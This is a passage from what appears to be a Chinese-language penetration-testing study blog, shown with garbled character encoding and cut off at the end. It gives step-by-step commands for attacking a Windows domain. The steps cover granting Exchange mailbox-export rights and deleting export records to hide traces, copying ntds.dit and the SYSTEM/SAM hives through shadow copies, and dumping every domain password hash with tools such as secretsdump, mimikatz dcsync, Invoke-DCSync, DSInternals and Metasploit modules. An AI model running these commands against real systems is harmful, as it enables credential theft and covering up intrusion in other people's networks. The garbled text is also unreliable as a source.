microsoft.exchange*</code></pre></li></ul><p>è·å–ç°æœ‰ç”¨æˆ·é‚®ä»¶åœ°å€</p><ul><li>æŸ¥çœ‹å…¨éƒ¨ç”¨æˆ·é‚®ç®±ä½¿ç”¨ä¿¡æ¯</li></ul><pre><code>Get-Mailbox | Format-Tables Name,WindowsEmailAddress</code></pre><ul><li>æŸ¥çœ‹æŒ‡å®šç”¨æˆ·é‚®ç®±ä½¿ç”¨ä¿¡æ¯</li></ul><pre><code>get-mailboxstatistics -identity administrator | Select DisplayName,ItemCount,TotalltemSize,LastLogonTime</code></pre><ul><li>æŸ¥çœ‹å…¨éƒ¨ç”¨æˆ·é‚®ç®±ä½¿ç”¨ä¿¡æ¯</li></ul><pre><code>Get-Mailbox -ResultSize Unlimited | Get-MailboxStatistics | Sort-Object TotalltemSize-Descend</code></pre><p><strong>æ·»åŠ æƒé™</strong></p><ul><li><p>æŸ¥çœ‹ç”¨æˆ·è§’è‰²æƒé™</p><pre><code>Get-ManagementRoleAssignment -role &quot;Mailbox Import Export&quot; | Format-List RoleAssigneeName</code></pre></li><li><p>æ·»åŠ ç”¨æˆ·è§’è‰²æƒé™</p></li></ul><pre><code>New-ManagementRoleAssignment -Name &quot;Import Export_Domain Admins&quot; -User &quot;Administrator&quot; -Role &quot;Mailbox Import Export&quot;</code></pre><ul><li>åˆ é™¤ç”¨æˆ·è§’è‰²æƒé™</li></ul><pre><code>Remove-ManagementRoleAssignment &quot;Import Export_Domain Admins&quot; -Confirm:$false</code></pre><p><strong>è®¾ç½®ç½‘ç»œå…±äº«æ–‡ä»¶å¤¹</strong></p><pre><code>net share inetpub=c:\inetpub /grant:everyone,full</code></pre><p><strong>æ¸…ç†ç—•è¿¹</strong></p><ul><li>æŸ¥çœ‹ä¹‹å‰äº§ç”Ÿçš„å¯¼å‡ºè¯·æ±‚è®°å½•</li></ul><pre><code>Get-MailboxExportRequest</code></pre><ul><li>åˆ é™¤å¯¼å‡ºè¯·æ±‚è®°å½•</li></ul><pre><code>Remove-MailboxExportRequest -Identity Administrator\mailboxexport</code></pre><h2 id="æ”»å‡»åŸŸæ§åˆ¶å™¨"><a href="#æ”»å‡»åŸŸæ§åˆ¶å™¨" class="headerlink" title="æ”»å‡»åŸŸæ§åˆ¶å™¨"></a>æ”»å‡»åŸŸæ§åˆ¶å™¨</h2><h3 id="å¯¼å‡ºntds-ditå·¥å…·ä½¿ç”¨"><a href="#å¯¼å‡ºntds-ditå·¥å…·ä½¿ç”¨" class="headerlink" title="å¯¼å‡ºntds.ditå·¥å…·ä½¿ç”¨"></a><strong>å¯¼å‡ºntds.ditå·¥å…·ä½¿ç”¨</strong></h3><h4 id="ntdsutilå·¥å…·æå–"><a href="#ntdsutilå·¥å…·æå–" class="headerlink" title="ntdsutilå·¥å…·æå–"></a>ntdsutilå·¥å…·æå–</h4><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220702110915019.png" alt="image-20220702110915019"></p><p>å‘½ä»¤:</p><p>åˆ›å»ºå¿«ç…§:</p><pre><code>ntdsutil snapshot &quot;activate instance ntds&quot; create quit quit</code></pre><p>æŒ‚è½½å¿«ç…§:</p><pre><code>ntdsutil snapshot &quot;mount &#123;GUID&#125;&quot; quit quit</code></pre><p>æ‹·è´å¿«ç…§:</p><pre><code>copy C:\$SNAP_201808131112_VOLUMEC$\windows\ntds\ntds.dit c:\windows\temp\ntds.dit</code></pre><p>å¸è½½å¹¶åˆ é™¤å¿«ç…§:</p><pre><code>ntdsutil snapshot &quot;unmount &#123;GUID&#125;&quot; &quot;delete &#123;GUID&#125;&quot; quit quit</code></pre><p>æŸ¥çœ‹å¿«ç…§</p><pre><code>ntdsutil snapshot &quot;List All&quot; quit quit</code></pre><h4 id="vssadminå·¥å…·å¯¼å‡º"><a href="#vssadminå·¥å…·å¯¼å‡º" class="headerlink" title="vssadminå·¥å…·å¯¼å‡º"></a>vssadminå·¥å…·å¯¼å‡º</h4><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220702112559750.png" alt="image-20220702112559750"></p><p>å‘½ä»¤:</p><p>åˆ›å»ºå¿«ç…§:</p><pre><code>vssadmin create shadow /for=c:</code></pre><p>å¤åˆ¶æ–‡ä»¶</p><pre><code>copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy5\windows\NTDS\ntds.dit c:\ntds,dit</code></pre><p>åˆ é™¤å¿«ç…§</p><pre><code>vssadmin delete shadows /for=c : /quite</code></pre><h4 id="åˆ©ç”¨vssown-vbsæå–"><a href="#åˆ©ç”¨vssown-vbsæå–" class="headerlink" title="åˆ©ç”¨vssown.vbsæå–"></a>åˆ©ç”¨vssown.vbsæå–</h4><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220702113237136.png" alt="image-20220702113237136"></p><pre><code>https://raw.githubusercontent.com/borigue/ptscripts/master/windows/vssown.vbs</code></pre><pre><code>cscript vssown.vbs /start #å¯åŠ¨å·å½±å¤åˆ¶æœåŠ¡cscipt vssown.vbs/create c #åˆ›å»ºä¸€ä¸ªcç›˜çš„å·å½±å‰¯æœ¬copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy5\windows\NTDS\ntds.dit c:\ntds,ditescript vssown.vbs /list #åˆ—å‡ºå½“å‰å·å½±å‰¯æœ¬escript vssown.vbs /delete #åˆ é™¤å·å½±å‰¯æœ¬</code></pre><h4 id="NTDSUTILçš„IFM"><a href="#NTDSUTILçš„IFM" class="headerlink" title="NTDSUTILçš„IFM"></a>NTDSUTILçš„IFM</h4><pre><code>ntdsutil &quot;ac i ntds&quot; &quot;ifm&quot; &quot;create full c:/test&quot;q q</code></pre><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220702114121276.png" alt="image-20220702114121276"></p><h4 id="åˆ©ç”¨powershell"><a href="#åˆ©ç”¨powershell" class="headerlink" title="åˆ©ç”¨powershell"></a>åˆ©ç”¨powershell</h4><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220702114210607.png" alt="image-20220702114210607"></p><h4 id="DiskShadow"><a href="#DiskShadow" class="headerlink" title="DiskShadow"></a>DiskShadow</h4><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220702151613418.png" alt="image-20220702151613418"></p><p>DiskShadowå¯ä»¥ç”¨æ¥æ‰§è¡Œå‘½ä»¤</p><p>ç¤ºä¾‹:</p><p>å°†å‘½ä»¤å†™å…¥æ–‡ä»¶:</p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220702153003868.png" alt="image-20220702153003868"></p><p>ä½¿ç”¨diskshadowæ‰§è¡Œ</p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220702153216260.png" alt="image-20220702153216260"></p><p>ä½¿ç”¨diskshadowå¯¼å‡ºntds.dit</p><p>å°†ä¸‹åˆ—å‘½ä»¤å†™å…¥åˆ°command.txtæ–‡ä»¶</p><pre><code>set context persistent nowritersadd volume c: alias someAliascreateexpose %someAlias% k:exec &quot;cmd.exe&quot; /c copy k:\\windows\\ntds\\ntds.dit c:\\ntds.ditdelete shadows alllist shadows allresetexit</code></pre><p>ç„¶åæ‰§è¡Œ</p><pre><code>diskshadow /s C:\\command.txt # æ³¨æ„è¿™é‡Œéœ€è¦è¿›å…¥C:\Windows\System32ç›®å½•ä¸‹æ‰§è¡Œï¼Œå¦åˆ™ä¼šæŠ¥é”™</code></pre><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220702154731904.png" alt="image-20220702154731904"></p><p>å¯¼å‡ºntds.ditåï¼Œå¯ä»¥å°†system.hiveè½¬å‚¨ã€‚å› ä¸ºsystem.hiveä¸­å­˜æ”¾ç€ntds.dit çš„å¯†é’¥ï¼Œæ‰€ä»¥æ²¡æœ‰è¯¥å¯†é’¥ï¼Œå°†æ— æ³•æŸ¥çœ‹ntds.ditä¸­çš„ä¿¡æ¯</p><p>system.hiveæ–‡ä»¶åœ¨</p><pre><code>C:\Windows\System32\config</code></pre><p>ç›´æ¥ä½¿ç”¨æ³¨å†Œè¡¨å‘½ä»¤å°†system.liveæ–‡ä»¶å¯¼å‡ºåˆ°å½“å‰è·¯å¾„</p><pre><code>reg save hklm\system system.hive #åŒç†samä¹Ÿå¯ä»¥è¿™æ ·å¯¼å‡º reg save hklm\sam sam.hive</code></pre><h3 id="è§£æntds-dit"><a href="#è§£æntds-dit" class="headerlink" title="è§£æntds.dit"></a><strong>è§£æntds.dit</strong></h3><h4 id="ä½¿ç”¨esedbexportå’Œntdsxtractæ¢å¤ntds-ditæå–å…¶æ•£åˆ—å€¼"><a href="#ä½¿ç”¨esedbexportå’Œntdsxtractæ¢å¤ntds-ditæå–å…¶æ•£åˆ—å€¼" class="headerlink" title="ä½¿ç”¨esedbexportå’Œntdsxtractæ¢å¤ntds.ditæå–å…¶æ•£åˆ—å€¼"></a>ä½¿ç”¨esedbexportå’Œntdsxtractæ¢å¤ntds.ditæå–å…¶æ•£åˆ—å€¼</h4><p>esedbexportå®‰è£…:</p><p>åœ¨kaliä¸‹è½½libesedb</p><pre><code class="shell">wget https://github.com/libyal/libesedb/releases/download/20210424/libesedb-experimental-20210424.tar.gz</code></pre><p>ä¸‹è½½å®‰è£…ä¾èµ–ç¯å¢ƒ</p><pre><code class="shell">apt-get install autoconf automake autopoint libtool pkg-config</code></pre><p>è§£å‹</p><pre><code class="shell">tar -xzvf libesedb-experimental-20210424.tar.gz</code></pre><p>é…ç½®</p><pre><code class="shell">cd libesedb-20210424./configure</code></pre><p>ç¼–è¯‘</p><pre><code class="shell">make</code></pre><p>å®‰è£…</p><pre><code class="shell">sudo make install</code></pre><p>é…ç½®</p><pre><code class="shell">sudo ldconfig</code></pre><p>å®‰è£…å®Œæˆåä¼šåœ¨<code>/usr/local/bin</code>ç›®å½•ä¸‹çœ‹åˆ°<code>esedbexport</code>ç¨‹åº</p><p>å°†<code>ntds.dit</code>æ–‡ä»¶ä¸Šä¼ åˆ°kaliä¸­ï¼Œä½¿ç”¨<code>esedbexport</code>è¿›è¡Œæ¢å¤æ“ä½œ</p><pre><code class="shell">esedbexport -m table ntds.dit</code></pre><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220702170750923.png" alt="image-20220702170750923"></p><p>æå–æ ¹æ®ntds.ditçš„æ•£åˆ—å€¼æå–å…¶å†…å®¹çš„æ–¹æ³•:</p><p>ä½¿ç”¨ntdsxtract</p><p>å®‰è£…å‘½ä»¤:</p><pre><code class="shell">git clone https://github.com/csababarta/ntdsxtract.gitcd ntdsxtract/python setup.py build &amp;&amp; python setup.py install</code></pre><p>å®‰è£…å®Œæˆåï¼Œæˆ‘ä»¬å°†ä¸Šä¸€æ­¥ä¸­å¯¼å‡ºçš„â€œntds.dit.exportâ€æ–‡ä»¶å¤¹ä¸­çš„datatable.3ã€link_table.5è¿™ä¸¤ä¸ªè¡¨å’Œä¹‹å‰è·å¾—çš„â€œSYSTEMâ€æ–‡ä»¶ä¸€å¹¶æ”¾å…¥ntdsxtractçš„æ–‡ä»¶å¤¹ä¸­ã€‚ç„¶åæˆ‘ä»¬å°±å¯ä»¥æ‰§è¡Œå¦‚ä¸‹å‘½ä»¤ï¼Œå°†åŸŸå†…çš„æ‰€æœ‰ç”¨æˆ·åŠæ•£åˆ—å€¼å¯¼å‡ºåˆ°result.txtæ–‡ä»¶ä¸­</p><pre><code class="shell">dsusers.py &lt;datatable&gt; &lt;link_table&gt; &lt;output_dir&gt; --syshive &lt;systemhive&gt; --passwordhashes &lt;format options&gt;</code></pre><p>å‘½ä»¤:</p><pre><code class="shell">python dsusers.py ntds.dit.export/datatable.3 ntds.dit.export/link_table.5 output --syshive system.hive --passwordhashes --pwdformat ocl --ntoutfile ntout --lmoutfile lmout | tee result.txt# â€“pwdformaté€‰é¡¹æ˜¯é€‰æ‹©ä»¥ä»€ä¹ˆæ ¼å¼è¿›è¡Œæå–ï¼Œæœ‰john(John format)ã€ocl(oclHashcat)ã€ophc(OphCrack)ä¸‰ä¸ªé€‰é¡¹ã€‚</code></pre><p>æœ€ç»ˆè·å¾—æ–‡ä»¶</p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220706162054315.png" alt="image-20220706162054315"></p><p>Ntdsxtractä¸­è¿˜å…·æœ‰ä¸€ä¸ªâ€œdscomputers.pyâ€å·¥å…·å¯ä»¥ä»åˆ†ç¦»å‡ºæ¥çš„è¡¨ä¸­æå–åŸŸä¸­è®¡ç®—æœºä¿¡æ¯ã€‚è¿™å¯¹äºç¦»çº¿åˆ†æç›®æ ‡ä¿¡æ¯æ˜¯éå¸¸æœ‰ç”¨çš„ã€‚</p><p>åœ¨ä½¿ç”¨è¿‡ç¨‹ä¸­ï¼Œéœ€è¦å¯¹å®ƒæä¾›datatableï¼Œè¾“å‡ºç›®å½•ä»¥åŠè¾“å‡ºæ–‡ä»¶ï¼Œè¾“å‡ºæ–‡ä»¶çš„æ ¼å¼ä¸ºcsvï¼š</p><pre><code class="shell">python dscomputers.py ntds.dit.export/datatable.3 computer_output --csvoutfile domain_computers_info.csv </code></pre><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220706162710090.png" alt="image-20220706162710090"></p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220706162817060.png" alt="image-20220706162817060"></p><h4 id="ä½¿ç”¨Impacketä¸­çš„secretsdump"><a href="#ä½¿ç”¨Impacketä¸­çš„secretsdump" class="headerlink" title="ä½¿ç”¨Impacketä¸­çš„secretsdump"></a>ä½¿ç”¨Impacketä¸­çš„secretsdump</h4><p>ä¸‹è½½åœ°å€ï¼š<a href="https://github.com/SecureAuthCorp/impacket">https://github.com/SecureAuthCorp/impacket</a></p><p>secretsdump.pyæ˜¯Impacketå·¥å…·åŒ…ä¸­çš„ä¸€ä¸ªè„šæœ¬ï¼Œè¯¥è„šæœ¬å®ç°äº†å¤šç§ä¸éœ€è¦åœ¨è¿œç¨‹ä¸»æœºä¸Šæ‰§è¡Œä»»ä½•ä»£ç†çš„æƒ…å†µä¸‹è½¬å‚¨æœºå¯†æ•°æ®çš„æŠ€æœ¯ã€‚å¯¹äºSAMå’ŒLSA Secretsï¼ˆåŒ…æ‹¬ç¼“å­˜çš„å‡­æ®ï¼‰ï¼Œæˆ‘ä»¬å°½å¯èƒ½çš„å°è¯•ä»æ³¨å†Œè¡¨ä¸­è¯»å–ï¼Œç„¶åå°†hivesä¿å­˜åœ¨ç›®æ ‡ç³»ç»Ÿï¼ˆï¼…SYSTEMROOTï¼…\Tempç›®å½•ï¼‰ä¸­ï¼Œå¹¶ä»é‚£é‡Œè¯»å–å…¶ä½™çš„æ•°æ®ã€‚</p><p>secretsdump.pyæœ‰ä¸€ä¸ªæœ¬åœ°é€‰é¡¹ï¼Œå¯ä»¥è§£æNtds.ditæ–‡ä»¶å¹¶ä»Ntds.ditä¸­æå–å“ˆå¸Œæ•£åˆ—å€¼å’ŒåŸŸä¿¡æ¯ã€‚åœ¨æ­¤ä¹‹å‰ï¼Œæˆ‘ä»¬å¿…é¡»è·å–åˆ°Ntds.ditå’ŒSYSTEMè¿™ä¸¤ä¸ªæ–‡ä»¶ã€‚</p><p>ä½¿ç”¨æ–¹æ³•:</p><pre><code class="shell">git clone https://github.com/SecureAuthCorp/impacketcd impacketsudo python3 setup.py installcd ..cd examplepython3 secretsdump.py -system /ç›®å½•/system.hive -ntds /ç›®å½•/ntds.dit LOCAL</code></pre><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220706222324453.png" alt="image-20220706222324453"></p><h4 id="PowerShellä¸‹çš„åˆ©ç”¨"><a href="#PowerShellä¸‹çš„åˆ©ç”¨" class="headerlink" title="PowerShellä¸‹çš„åˆ©ç”¨"></a>PowerShellä¸‹çš„åˆ©ç”¨</h4><p>DSInternals PowerShellæ¨¡å—æä¾›äº†æ„å»ºåœ¨æ¡†æ¶ä¹‹ä¸Šçš„æ˜“äºä½¿ç”¨çš„cmdletã€‚ä¸»è¦åŠŸèƒ½åŒ…æ‹¬ç¦»çº¿ntds.ditæ–‡ä»¶æ“ä½œä»¥åŠé€šè¿‡ç›®å½•å¤åˆ¶æœåŠ¡ï¼ˆDRSï¼‰è¿œç¨‹åè®®æŸ¥è¯¢åŸŸæ§åˆ¶å™¨ã€‚</p><p>ä¸‹è½½åœ°å€ï¼š<a href="https://github.com/MichaelGrafnetter/DSInternals">https://github.com/MichaelGrafnetter/DSInternals</a></p><p>æ”¯æŒç³»ç»Ÿï¼š</p><ul><li>Windows Server 2012 R2</li><li>Windows Server 2008 R2</li><li>Windows 10 64-bit</li><li>Windows 8.1 64-bit</li><li>Windows 7 64-bit</li></ul><p>å®‰è£…ä¸é…ç½®æ–¹æ³•ï¼š</p><pre><code class="shell">PowerShell 5.0ï¼šInstall-Module DSInternalsæˆ–Install-Module -Name DSInternals -RequiredVersion 3.2.1PowerShell 3.0ã€4.0ï¼šè§£å‹å‹ç¼©åŒ… cd C:\DSInternalsImport-Module .\DSInternals</code></pre><p>ä½¿ç”¨DSInternalsæ¨¡å—æå–ç”¨æˆ·å“ˆå¸Œå€¼ï¼Œæˆ‘ä»¬éœ€è¦å…ˆè·å–Ntds.ditã€SYSTEMè¿™ä¸¤ä¸ªæ–‡ä»¶ã€‚å°†Ntds.ditã€SYSTEMè¿™ä¸¤ä¸ªæ–‡ä»¶å¯¼å‡ºå¹¶æ‹–åˆ°æˆ‘ä»¬æœ¬åœ°åï¼Œå³å¯æ‰§è¡Œå¦‚ä¸‹å‘½ä»¤è·å–æ‰€æœ‰è´¦æˆ·å“ˆå¸Œï¼š</p><pre><code class="shell">Import-Module DSInternals       // å¯¼å…¥DSInternalsæ¨¡å—// è·å–æ‰€æœ‰è´¦æˆ·ä¿¡æ¯ï¼š$key = Get-Bootkey -SystemHivePath &#39;C:\ç›®å½•\system.hive&#39;    Get-ADDBAccount -All -DBPath &#39;C:\ç›®å½•\ntds.dit&#39; -Bootkey $key</code></pre><p>è¿˜å¯ä»¥å¯¼å‡ºæ”¯æŒHashcatæ ¼å¼çš„å“ˆå¸Œï¼š</p><pre><code class="shell">$key = Get-Bootkey -SystemHivePath &#39;C:\ç›®å½•\system.hive&#39;Get-ADDBAccount -All -DBPath &#39;C:\ç›®å½•\ntds.dit&#39; -BootKey $key | Format-Custom -View HashcatNT | Out-File hashes.txt</code></pre><h4 id="ä½¿ç”¨NTDSDumpex-exeå¯ä»¥å¯¼å‡ºæ•£åˆ—å€¼"><a href="#ä½¿ç”¨NTDSDumpex-exeå¯ä»¥å¯¼å‡ºæ•£åˆ—å€¼" class="headerlink" title="ä½¿ç”¨NTDSDumpex.exeå¯ä»¥å¯¼å‡ºæ•£åˆ—å€¼"></a>ä½¿ç”¨NTDSDumpex.exeå¯ä»¥å¯¼å‡ºæ•£åˆ—å€¼</h4><p>ä½¿ç”¨NTDSDumpex.exeå¯ä»¥è¿›è¡Œå¯¼å‡ºæ•£åˆ—å€¼çš„æ“ä½œã€‚</p><p>å°†ntds.ditã€NTDSDumpex.exeã€system.hive æ”¾åœ¨åŒä¸€ç›®å½•ä¸‹ï¼Œè¾“å…¥å¦‚ä¸‹å‘½ä»¤å³å¯å¯¼å‡ºåŸŸè´¦å·å’Œæ•£åˆ—å€¼ã€‚</p><p>NTDSDumpEx.exeä¸‹è½½åœ°å€ï¼š<a href="https://github.com/zcgonvh/NTDSDumpEx">https://github.com/zcgonvh/NTDSDumpEx</a></p><p>è·å–keyï¼šreg save HKLM\SYSTEM c:\windows\temp\Sys.hiv</p><p>ä½¿ç”¨NTDSDumpExè·å–æ‰€æœ‰åŸŸç”¨æˆ·çš„Hash</p><pre><code class="shell">NTDSDumpEx.exe -d ntds.dit -s system.hive -o hash.txt</code></pre><h4 id="åœ¨çº¿åˆ©ç”¨dcsyncè·å–æå–Ntds-ditä¸­çš„å“ˆå¸Œ"><a href="#åœ¨çº¿åˆ©ç”¨dcsyncè·å–æå–Ntds-ditä¸­çš„å“ˆå¸Œ" class="headerlink" title="åœ¨çº¿åˆ©ç”¨dcsyncè·å–æå–Ntds.ditä¸­çš„å“ˆå¸Œ"></a>åœ¨çº¿åˆ©ç”¨dcsyncè·å–æå–Ntds.ditä¸­çš„å“ˆå¸Œ</h4><p>DCSyncæ˜¯Mimikatzåœ¨2015å¹´æ·»åŠ çš„ä¸€ä¸ªåŠŸèƒ½ï¼Œç”±Benjamin DELPY gentilkiwiå’ŒVincent LE TOUXå…±åŒç¼–å†™ï¼Œå…¶èƒ½å¤Ÿåˆ©ç”¨å·å½±æ‹·è´æœåŠ¡ç›´æ¥è¯»å–ndts.ditå¹¶å¯¼å‡ºåŸŸå†…æ‰€æœ‰ç”¨æˆ·çš„å“ˆå¸Œå€¼ã€‚éœ€è¦ç®¡ç†å‘˜æƒé™ã€‚</p><p>Mimikatzä¸‹è½½åœ°å€ï¼š<a href="https://github.com/gentilkiwi/mimikatz">https://github.com/gentilkiwi/mimikatz</a></p><p>åˆ©ç”¨Mimikatzçš„dcsyncåŠŸèƒ½è·å–æå–Ntds.ditä¸­çš„å“ˆå¸Œçš„æ“ä½œå¦‚ä¸‹ï¼š</p><p>åœ¨åŸŸå†…ä»»æ„ä¸€å°ä¸»æœºä¸Šè¿è¡Œmimikatzå¹¶æ‰§è¡Œå¦‚ä¸‹å‘½ä»¤ï¼š</p><pre><code>lsadump::dcsync /domain:xxx.com /all /csvlsadump::dcsync /domain:god.org /all /csv</code></pre><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220706225104256.png" alt="image-20220706225104256"></p><p>æˆ–è€…</p><pre><code class="shell">privilege::debugloglsadump::lsa /inject</code></pre><h4 id="åœ¨çº¿-PowerShellæå–Ntds-ditä¸­çš„å“ˆå¸Œ"><a href="#åœ¨çº¿-PowerShellæå–Ntds-ditä¸­çš„å“ˆå¸Œ" class="headerlink" title="åœ¨çº¿-PowerShellæå–Ntds.ditä¸­çš„å“ˆå¸Œ"></a>åœ¨çº¿-PowerShellæå–Ntds.ditä¸­çš„å“ˆå¸Œ</h4><p>å³Invoke-DCSync.ps1è„šæœ¬ã€‚</p><p>ä¸‹è½½åœ°å€ï¼š<a href="https://gist.github.com/monoxgas/9d238accd969550136db">https://gist.github.com/monoxgas/9d238accd969550136db</a></p><p>è¯¥è„šæœ¬é€šè¿‡Invoke-ReflectivePEinjectionè°ƒç”¨mimikatz.dllä¸­çš„dcsyncåŠŸèƒ½ï¼Œå¹¶åˆ©ç”¨dcsyncç›´æ¥è¯»å–ntds.ditå¾—åˆ°åŸŸç”¨æˆ·å¯†ç æ•£åˆ—å€¼ã€‚</p><p>åœ¨åŸŸå†…ä»»ä½•ä¸€å°ä¸»æœºä¸Šé¢æ‰§è¡Œå¦‚ä¸‹å‘½ä»¤ï¼š</p><pre><code class="shell">Set-Executionpolicy bypassImport-Module .\Invoke-DCSync.ps 1Invoke-DCSync -DumpForest | ft -wrap -autosize    // å¯¼å‡ºåŸŸå†…æ‰€æœ‰ç”¨æˆ·çš„hashInvoke-DCSync -DumpForest -Users @(&quot;administrator&quot;) | ft -wrap -autosize      // å¯¼å‡ºåŸŸå†…administratorè´¦æˆ·çš„hash</code></pre><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220707102847191.png" alt="image-20220707102847191"></p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220707102954770.png" alt="image-20220707102954770"></p><h4 id="åœ¨çº¿-ä½¿ç”¨metasploitè·å–åŸŸæ•£åˆ—"><a href="#åœ¨çº¿-ä½¿ç”¨metasploitè·å–åŸŸæ•£åˆ—" class="headerlink" title="åœ¨çº¿-ä½¿ç”¨metasploitè·å–åŸŸæ•£åˆ—"></a>åœ¨çº¿-ä½¿ç”¨metasploitè·å–åŸŸæ•£åˆ—</h4><ul><li>Ntds.dit(ä¹Ÿè¢«ç§°ä¸ºActive Directory database)åŒ…å«äº†å½“å‰åŸŸç”¨æˆ·ä¸­æ‰€æœ‰çš„ç”¨æˆ·çš„è´¦å·ä¿¡æ¯å’Œå…¶hashå€¼</li><li>é»˜è®¤è·¯å¾„: C:\Windows\NTDS</li><li>åªèƒ½é€šè¿‡åŸŸæ§åˆ¶å™¨è¿›ç¨‹å’Œåè®®è®¿é—®</li></ul><p>å¯èƒ½ç”¨åˆ°çš„æ¨¡å—:</p><pre><code>post/windows/gather/ntds_location #è¯¥æ¨¡å—å¯æŸ¥çœ‹è·¯å¾„ntdspost/windows/gather/smart_hashdump #åœ¨çº¿å¯¼å‡ºåŸŸè´¦æˆ·hash(å»ºè®®2012ä»¥ä¸Šä½¿ç”¨)auxiliary/admin/smb/psexec_ntdsgrab #åˆ©ç”¨åŸŸç®¡è´¦æˆ·ï¼Œå¯¼å‡ºntdså¿…è¦æ–‡ä»¶åˆ°æœ¬åœ°post/windows/gather/ntds_grabber #åˆ©ç”¨powershellå°†ntdså¿…è¦æ–‡ä»¶ä¸‹è½½åˆ°æœ¬åœ°åä½¿ç”¨post/windows/gather/credentials/domain_hashdump #ä»‹ç»å…¶æ–¹æ³•</code></pre><h4 id="åœ¨çº¿-ä½¿ç”¨vshadowå’ŒQuarksPwDumpå¯¼å‡ºåŸŸè´¦å·å’ŒåŸŸæ•£åˆ—å€¼"><a href="#åœ¨çº¿-ä½¿ç”¨vshadowå’ŒQuarksPwDumpå¯¼å‡ºåŸŸè´¦å·å’ŒåŸŸæ•£åˆ—å€¼" class="headerlink" title="åœ¨çº¿-ä½¿ç”¨vshadowå’ŒQuarksPwDumpå¯¼å‡ºåŸŸè´¦å·å’ŒåŸŸæ•£åˆ—å€¼"></a>åœ¨çº¿-ä½¿ç”¨vshadowå’ŒQuarksPwDumpå¯¼å‡ºåŸŸè´¦å·å’ŒåŸŸæ•£åˆ—å€¼</h4><p>åœ¨æ­£å¸¸çš„åŸŸç¯å¢ƒä¸­ï¼Œntds.dit æ–‡ä»¶é‡ŒåŒ…å«å¤§é‡çš„ä¿¡æ¯ï¼Œä½“ç§¯è¾ƒå¤§ï¼Œä¸æ–¹ä¾¿ä¿å­˜åˆ°æœ¬åœ°ã€‚</p><p>å¦‚æœåŸŸæ§åˆ¶å™¨ä¸Šæ²¡æœ‰å®‰è£…æ€æ¯’è½¯ä»¶ï¼Œæ”»å‡»è€…å°±èƒ½ç›´æ¥è¿›å…¥åŸŸæ§åˆ¶å™¨ï¼Œå¯¼å‡º ntds.dit å¹¶è·å¾—åŸŸè´¦å·å’ŒåŸŸæ•£åˆ—å€¼ï¼Œè€Œä¸éœ€è¦å°† ntds.dit ä¿å­˜åˆ°æœ¬åœ°ã€‚</p><p>QuarksPwDump å¯ä»¥å¿«é€Ÿã€å®‰å…¨ã€å…¨é¢åœ°è¯»å–å…¨éƒ¨åŸŸè´¦å·å’ŒåŸŸæ•£åˆ—å€¼ã€‚</p><p>QuarksPwDump ä¸‹è½½åœ°å€ï¼š<a href="https://github.com/tuthimi/quarkspwdump/tree/master/Release">https://github.com/tuthimi/quarkspwdump/tree/master/Release</a></p><p>ShadowCopy.bat ä½¿ç”¨å¾®è½¯çš„å·å½±æ‹·è´æŠ€æœ¯ï¼Œèƒ½å¤Ÿå¤åˆ¶è¢«é”å®šçš„æ–‡ä»¶åŠè¢«å…¶ä»–ç¨‹åºæ‰“å¼€çš„æ–‡ä»¶ï¼Œä»£ç å¦‚ä¸‹</p><pre><code class="shell">setlocalif NOT &quot;%CALLBACK_SCRIPT%&quot;==&quot;&quot; goto :IS_CALLBACKset SOURCE_DRIVE_LETTER=%SystemDrive%set SOURCE_RELATIVE_PATH=windows\ntds\ntds.ditset DESTINATION_PATH=%~dp0@echo ...Determine the scripts to be executed/generated...set CALLBACK_SCRIPT=%~dpnx0set TEMP_GENERATED_SCRIPT=GeneratedVarsTempScript.cmd@echo ...Creating the shadow copy...&quot;%~dp0vshadow.exe&quot; -script=%TEMP_GENERATED_SCRIPT% -exec=&quot;%CALLBACK_SCRIPT%&quot; %SOURCE_DRIVE_LETTER%del /f %TEMP_GENERATED_SCRIPT%@goto :EOF:IS_CALLBACKsetlocal@echo ...Obtaining the shadow copy device name...call %TEMP_GENERATED_SCRIPT%@echo ...Copying from the shadow copy to the destination path...copy &quot;%SHADOW_DEVICE_1%\%SOURCE_RELATIVE_PATH%&quot; %DESTINATION_PATH%reg save hklm\system system.hive</code></pre><p>shadow.exe æ˜¯ä» Windows SDK ä¸­æå–å‡ºæ¥çš„ï¼Œéœ€è¦å…ˆå®‰è£… Windows SDKï¼Œä¸‹è½½åœ°å€ï¼š<a href="https://developer.microsoft.com/en-us/windows/downloads/sdk-archive/">https://developer.microsoft.com/en-us/windows/downloads/sdk-archive/</a></p><p>åœ¨è¿™ä¸ªé¡¹ç›®ä¸­ï¼Œä½œè€…å·²ç»ç»™å‡ºäº†shadow.exe:</p><p><a 